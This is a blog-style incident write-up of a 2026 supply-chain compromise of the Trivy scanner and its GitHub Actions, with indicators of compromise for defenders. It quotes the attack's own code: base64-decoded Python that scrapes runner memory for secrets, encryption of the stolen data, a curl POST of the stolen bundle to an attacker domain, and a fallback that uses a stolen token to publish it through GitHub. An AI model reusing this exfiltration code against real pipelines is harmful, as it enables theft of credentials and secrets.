---
layout: post
title: A (twirls moustache) non-Trivyal matter
date: 2026-03-27 13:50:00
categories: incident
tags: incident
---

On March 22 2026, Aquasec (developers and publishers of vaunted container security tool _Trivy_) [broke the news](https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/) that no user of a vaunted container security tool wants to hear from its developers and/or publishers.

They, Aquasec, had been compromised and the attackers had used this access to publish versions of Trivy with malicious code baked in. Worse, really, was that they had also hijacked the Github Actions workflows `trivy-action` and `setup-trivy`, meaning that you need not even consciously update to a new, compromised version of the software to fall victim.

# Beginnings
The perpetrators made their first move on March 17th, registering the domain `aquasecurtiy.org` (importantly close, but distinct from the genuine `aquasecurity.com`), and set up the subdomain `scan.aquasecurtiy.org` which, at time of writing, still points to `45.148.10.212`. This IP is owned by a hosting provider registered in the UK, named _DMZHost_, but is an IP registered to Andorra. Of course, a domain like that positively _screams_ imminent mischief, but as with so many successful cyberattacks, fell in amongst the deafening noise that is the internet.

This was the initial setup for a two-pronged (maybe one and a half pronged) attack, with the server sat listening on the IP presumably readied for incoming traffic. There'd be a lot.

# Github Actions
Github Actions is neat, really. It's a fairly lightweight CI/CD platform with easy, YAML-configured workflows and some handy thought given to reusability. For example, Github themselves publish basic actions like `actions/checkout` which will checkout a given repository to the runner and thus enable it to do important things with the code therein - you need not write your own. Similarly, Aquasec publishes a few actions to do things like set up Trivy inside the runner as a precursor to scanning a container you've just built. Should Trivy shriek about the 17 criticals you've giddily built into your software, you can cause the workflow to fail and no deployment to be made. As I say, great.

But, dear reader, what happens when a widely used action is compromised?

## Bad: You use `@main` or similar
If you specify (again, using a very bland example action) `actions/checkout@main` then your workflow will always be executing the code on the `main` branch of the action's repository at the time of execution. It's a fast way to suffer bugs at best. Don't do this. You're a bad person if you do this. 

## Less bad but still bad: You use `@1.2.3` or similar
This, on the face of it, is better, right? It is better, it's just still _bad_, as many Trivy workflow users discovered. They had audited version `0.34.2` of `trivy-action` and concluded that it was safe. And it was safe! The issue is that `0.34.2` is a git tag - a signpost to a commit, the actual, _real_ unit git concerns itself with most of all. And signposts don't necessarily point today at what they pointed at yesterday.

This is the functionality Aquasec's attackers abused. After well-meaning services like Github's `dependabot` cheerfully created PRs encouraging many thousands of users to update to `0.34.2` - a genuine, clean release at the time - on March 19th, they force-pushed (this is a legitimate git term, I promise) a new `0.34.2` tag that pointed to their new, malicious commit. Users were still installing and using `trivy-action@0.34.2`, it's just that the signpost that had pointed to a glitzy suburb of Milan now pointed to downtown Wigan. These malicious commits even had metadata carefully designed to avoid suspicion, claiming to be authored by DmitriyLewen, a genuine Aquasec engineer, among others. More importantly, they contained over a hundred lines of new code.

The way they actually included this code abused an interesting design choice of Github's. When you fork an action-producing repository (hello again, `actions/checkout`) and publish a commit to your fork, the SHA of that commit can be referred to by anything anywhere, and it'll resolve to your commit. One might, not unreasonably think, that `actions/checkout@SHA-1` and `actions/checkout@SHA-2` resolve to code owned by the same user/s, but that is entirely false and not to be relied upon. The SHA of the checkout version pushed in the new workflow release pointed to, of course, the malicious version.

## Okay, but what does it actually do?
First and foremost, this thing actually still ensures Trivy runs and gives you your expected output. It doesn't just replace what the action _should_ do, which would arouse suspicion, but instead get up to its nefarious deeds beforehand and then hand over to the legitimate task you actually wanted to take place. Your action might take a little, negligible amount of time longer, but unless you look more closely, that'll be it.


### Environment Variables
It searches for environment variables - not just any, but those with juicy-sounding names that might include `ssh` or `env`, actually going to reasonable lengths to ensure it can collect them from the various kinds of Actions runners available

> As an interesting note, it actually makes a point of checking whether the value in an environment variables corresponds to a readable file and, if so, grabbing the contents of that file rather than the path itself. For instance, if you had set `SSH_PRIV_KEY=~/.ssh/id_rsa` then the private key itself will be harvested, not the comparatively harmless file path. There's an appreciable level of thought in that.

### Filesystem Secret Hunting and, if appropriate, a Backdoor
With the environment variable harvesting complete, the shell script hands over to some Python, thus far encoded in base64 to give some light obfuscation. The actual code run differs depending on whether the runner is a Github-hosted node or a self-hosted node, the latter being especially ambitious and both checking for credentials in almost any location you can imagine a Linux system keeping them and dropping a backdoor.

```bash
if [[ "$(uname)" == "Linux" && "$RUNNER_ENVIRONMENT" == "github-hosted" ]]; then
    PYTHON_STR='base64 here'
    MEMORY_SECRETS=$(echo -n "$PYTHON_STR" | base64 -d | sudo python3 | \
      tr -d '\0' | \
      grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u)
    printf '%s=%s\n' "MEMORY_PARSE" "$MEMORY_SECRETS" >> "$COLLECTED"
else
    PYTHON_STR='different base64 here'
    SHELL_RUNNER_GOODIES=$(echo -n "$PYTHON_STR" | base64 -d | python3)
    printf '%s=%s\n' "SHELL_GOODIES" "$SHELL_RUNNER_GOODIES" >> "$COLLECTED"
fi
```

This `else` block is potentially the nastiest part of the whole thing - the backdoor. A file gets created at `~/.config/systemd/user/sysmon.py` (and a corresponding systemd unit to run it) which, after politely sleeping 5 minutes, calls `https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/`. This endpoint returns a Youtube link (currently Rick Astley, because of course it's Rick Astley) or, if not, the backdoor itself is downloaded to `/tmp/pglog` and executed.

### Encryption
The script encrypts the collected data using a bundled public key and a runtime-generated session key, before bundling the session key and data in a tar archive.

```bash
_PUB_KEY_PEM="$(mktemp)"
  cat > "$_PUB_KEY_PEM" <<'PUBKEY'
public key here
PUBKEY

_WORKDIR="$(mktemp -d)"
_SESSION_KEY="$_WORKDIR/session.key"
_ENC_FILE="$_WORKDIR/payload.enc"
_ENC_KEY="$_WORKDIR/session.key.enc"
_BUNDLE="$_WORKDIR/tpcp.tar.gz"

openssl rand 32 > "$_SESSION_KEY" 2>/dev/null
openssl enc -aes-256-cbc -in "$COLLECTED" -out "$_ENC_FILE" \
-pass "file:$_SESSION_KEY" -pbkdf2 2>/dev/null
openssl pkeyutl -encrypt -pubin -inkey "$_PUB_KEY_PEM" \
-in "$_SESSION_KEY" -out "$_ENC_KEY" \
-pkeyopt rsa_padding_mode:oaep 2>/dev/null
tar -czf "$_BUNDLE" -C "$_WORKDIR" payload.enc session.key.enc 2>/dev/null
```

### Exfiltration
Finally, exfiltration is attempted. Again, a little unusually, this thing has several options to work through here before admitting defeat:

#### HTTPS POST
Firstly, it tries to POST the tar archive to `scan.aquasecurtiy.org`

```bash
_HTTP=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    https://scan.aquasecurtiy.org \
    -H "Content-Type: application/octet-stream" \
    -H "X-Filename: tpcp.tar.gz" \
    --data-binary "@${_BUNDLE}" 2>/dev/null || echo "000")
```

#### Public Github Repo
Should the HTTP effort fail (i.e. the response code is not `2xx`), it will attempt to create a new, public github repository named `tpcp-docs` under the victim organisation, adding the tar archive as a release artifact. This makes the artifact visible to the world, but due to the encryption, useful only to the attacker.

```bash
if [[ ! "$_HTTP" =~ ^2 ]] && [ -n "${INPUT_GITHUB_PAT:-}" ]; then
    _REPO="tpcp-docs"
    _GH_AUTH="Authorization: token ${INPUT_GITHUB_PAT}"
    _GH_API="https://api.github.com"

    curl -s -X POST "${_GH_API}/user/repos" \
        -H "$_GH_AUTH" \
        -d '{"name":"'"${_REPO}"'","private":false,"auto_init":true}' \
        >/dev/null 2>&1 || true

    _GH_USER=$(curl -s -H "$_GH_AUTH" "${_GH_API}/user" 2>/dev/null \
        | grep -oE '"login"\s*:\s*"[^"]+"' | head -1 | sed 's/.*"\([^"]*\)"$/\1/')

    _TAG="data-$(date +%Y%m%d%H%M%S)"
    _RELEASE_ID=$(curl -s -X POST \
        "${_GH_API}/repos/${_GH_USER}/${_REPO}/releases" \
        -H "$_GH_AUTH" \
        -d '{"tag_name":"'"${_TAG}"'","name":"'"${_TAG}"'"}' \
        2>/dev/null | grep -oE '"id"\s*:\s*[0-9]+' | head -1 | grep -oE '[0-9]+')

    if [ -n "$_RELEASE_ID" ]; then
        curl -s -X POST \
        "https://uploads.github.com/repos/${_GH_USER}/${_REPO}/releases/${_RELEASE_ID}/assets?name=tpcp.tar.gz" \
        -H "$_GH_AUTH" \
        -H "Content-Type: application/octet-stream" \
        --data-binary "@${_BUNDLE}" >/dev/null 2>&1 || true
    fi
fi
```

#### Cloudflare tunnel
Should it find itself unable to create the repository, a Cloudflare tunnel (`plug-tab-protective-relay.trycloudflare.com`) is a third option.

A little over 100 lines of extra Github Actions code, and you should consider your workflow secrets exfiltrated. If you downloaded (or, god forbid, ran) Trivy `v0.69.4-6` (because they republished the malware after Aquasec thought they'd contained things), your own box should be set alight as well.

# IoCs
The indicators of compromise resulting from this attack are fairly easily defined, at least.

- Traffic to `scan.aquasecurtiy.org`, `plug-tab-protective-relay.trycloudflare.com` or `tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io` particularly HTTPS requests.
- Github repositories named `tpcp-docs` (the owner has been compromised)
- A local file at `~/.config/systemd/user/sysmon.py` or `/tmp/pglog`
- Trivy `0.69.4`, `0.69.5` or `0.69.6` _anywhere at all_
- Running of any of the following Github Actions reusable workflows in your own workflows, if git tags were in use:
    - `setup-trivy`
    - `tfsec`
    - `traceeshark`
    - `trivy-action`

Any of these IoCs should prompt revocation and rotation of appropriate secrets.

Have a look at [Aquasec](https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/)'s or [Wiz](https://www.wiz.io/blog/trivy-compromised-teampcp-supply-chain-attack)'s detailed writeup for further reading!